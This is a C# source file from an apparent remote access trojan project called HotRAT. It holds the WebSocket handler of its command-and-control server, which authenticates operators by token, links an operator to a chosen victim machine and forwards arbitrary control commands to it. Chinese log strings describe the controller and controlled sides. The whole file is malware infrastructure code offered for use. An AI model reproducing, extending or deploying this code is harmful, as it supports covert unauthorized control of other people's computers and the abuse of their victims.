using HotRAT.Server;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace HotRAT.WSServer.Models
{
    internal class WSHandles
    {
        public static async Task HandleMessage(NetworkStream stream, Guid cid, string msg)
        {
            var flags = msg.Split("\n");
            if(flags[0].ToUpper() == "AUTH" &&
               flags.Length == 2 &&
               flags[1] == Runtimes.Token())
            {
                foreach (var conns in Runtimes.WSserver._clients.Values)
                {
                    if (conns.Id == cid)
                    {
                        conns.Verified = true;
                    }
                }
                WebSocketServer.UpdataAllClients();
            }
            else
            {
                if (Runtimes.WSserver._clients.Values.Where(c => c.Id == cid).Select(c => c.Verified).First())
                {
                    switch (flags[0].ToUpper())
                    {
                        case "CONNECT":
                            if (flags.Length == 2)
                            {
                                foreach (var connects in Runtimes._clients)
                                {
                                    if (connects.Key.ToString() == flags[1])
                                    {
                                        Runtimes.CWrite($"主控{cid}与被控{flags[1]}建立连接", ConsoleColor.Green, true);
                                        connects.Value.AddControlled(cid);
                                        await WebSocketServer.SendMessageAsync(stream, JsonConvert.SerializeObject(new
                                        {
                                            type = "CONNECT_STATUS",
                                            data = new
                                            {
                                                status = true,
                                                id = flags[1]
                                            },
                                        }));

                                        WebSocketServer.UpdateSingleClient(connects.Value);
                                    }
                                }
                            }
                            break;
                        case "DISCONNECT":
                            if (flags.Length == 2)
                            {
                                foreach (var connects in Runtimes._clients)
                                {
                                    if (connects.Key.ToString() == flags[1])
                                    {
                                        Runtimes.CWrite($"主控{cid}与被控{flags[1]}断开连接", ConsoleColor.Red, true);
                                        connects.Value.DelControlled(cid);
                                        WebSocketServer.UpdateSingleClient(connects.Value);
                                    }
                                }
                            }
                            break;
                        case "CONTROL":
                            if (flags.Length == 2)
                            {
                                var targetClient = Runtimes._clients.Values
                                    .FirstOrDefault(c => c.Controlled.Contains(cid));

                                if (targetClient != null)
                                {
                                    _ = targetClient.SendAsync(string.Join("\n",flags.Skip(1)));
                                    Runtimes.CWrite($"已向被控 {targetClient.ConnectionId} 发送控制标志", ConsoleColor.Yellow,true);
                                }
                            }
                            break;
                        default:
                            break;
                    }
                }
            }
        }
    }
}
